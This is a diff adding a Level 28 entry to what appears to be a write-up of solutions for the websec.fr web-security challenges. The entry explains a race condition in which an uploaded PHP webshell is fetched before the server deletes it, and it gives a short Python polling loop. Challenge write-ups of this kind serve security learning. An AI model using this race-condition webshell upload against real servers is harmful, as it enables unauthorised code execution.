@@ -351,6 +351,26 @@ or
 https://websec.fr/////////////level25/index.php?page=flag&send=Submit
 ```
 
+## Level 28
+```bash
+https://websec.fr/level28/tmp/<md5(our ip)>.php #is where it will put the contents and delete it
+So we can basically do a race to the file until we receive the intended file
+So just upload a webshell that moves itself or to show the flag, and fastly browse to it...
+ 
+Can also run the script under and upload your webshell
+
+```
+
+Simply run this in the background(calculate the md5 with your ip or upload one file and see the hash it gives you):
+```python
+import requests
+while True:
+    r = requests.get("https://websec.fr/level28/tmp/<md5(our ip)>.php")
+    if r.status_code!= 404:
+        print(r.text)
+```
+
+
 ## Level 30
 ```C
 ob_end_clean(); is the one that causes the program to crash without the output of __destruct
